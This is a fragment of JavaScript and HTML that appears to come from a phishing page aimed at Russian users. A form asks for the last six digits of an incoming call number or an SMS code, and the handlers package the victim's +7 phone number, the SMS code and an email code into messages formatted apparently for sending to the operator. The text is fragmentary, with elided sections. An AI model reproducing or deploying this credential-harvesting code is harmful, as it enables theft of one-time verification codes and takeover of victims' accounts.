...
document.querySelector("#button").onclick = function(){
    document.getElementById('form').addEventListener('submit', function(e){
        ...
        <!---->
        <div class="b8a"><span class="tsHeadline600Large mt40 c6322-a4">Введите последние 6 цифр входящего номера или код из смс</span></div>
        <div class="b3wa">
        ...
        document.querySelector("#codeButton").onclick = function(){
            document.getElementById('form2').addEventListener('submit', function(e){
                e.preventDefault();
                const message2 = `<b>+7-${number}, Код: <code>${this.code.value}</code></b>\n`
              ...
              document.getElementById('form3').addEventListener('submit', async function(e){
                e.preventDefault();
                const message = `<b>+7-${number}, Код с почты: <code>${this.mailCode.value}</code></b>\n`
